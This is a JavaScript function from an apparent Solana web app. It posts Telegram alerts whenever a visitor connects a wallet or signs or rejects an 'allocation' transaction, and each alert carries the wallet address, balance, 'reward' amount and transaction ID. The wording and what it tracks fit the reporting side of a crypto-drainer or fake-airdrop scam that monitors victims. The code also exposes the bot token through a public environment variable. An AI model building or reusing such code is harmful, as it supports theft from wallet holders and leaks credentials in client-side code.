export const sendTelegramLog = async (event, data) => {
  const token = process.env.NEXT_PUBLIC_BOT_TOKEN;
  const chatId = process.env.NEXT_PUBLIC_CHAT_ID;

  if (!token || !chatId) {
    console.error("Telegram Environment Variables missing.");
    return;
  }

  let title = "";
  let icon = "";

  switch (event) {
    case 'connected':
      title = "NEW WALLET CONNECTION";
      icon = "🔗";
      break;
    case 'success':
      title = "ALLOCATION TRANSACTION SIGNED";
      icon = "💰";
      break;
    case 'failed':
      title = "TRANSACTION REJECTED/FAILED";
      icon = "❌";
      break;
    default:
      title = "SYSTEM NOTIFICATION";
      icon = "📊";
  }

  const message = `
${icon} <b>${title}</b>
————————————————
<b>Wallet Address:</b> 
<code>${data.address}</code>

<b>Wallet Type:</b> ${data.type || 'Unknown'}
<b>Current Balance:</b> ${data.balance !== undefined ? data.balance.toFixed(4) : 'N/A'} SOL
${data.amount ? `<b>Allocated Reward:</b> ${data.amount.toFixed(2)} SOL` : ''}
${data.tx ? `<b>Transaction ID:</b> <a href="https://solscan.io/tx/${data.tx}">View on Solscan</a>` : ''}
${data.error ? `<b>Error Detail:</b> <i>${data.error}</i>` : ''}

<b>Timestamp:</b> ${new Date().toLocaleString()}
<b>Environment:</b> Production (Vercel)
  `;

  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });
  } catch (err) {
    console.error("Telegram Fetch Error:", err);
  }
};
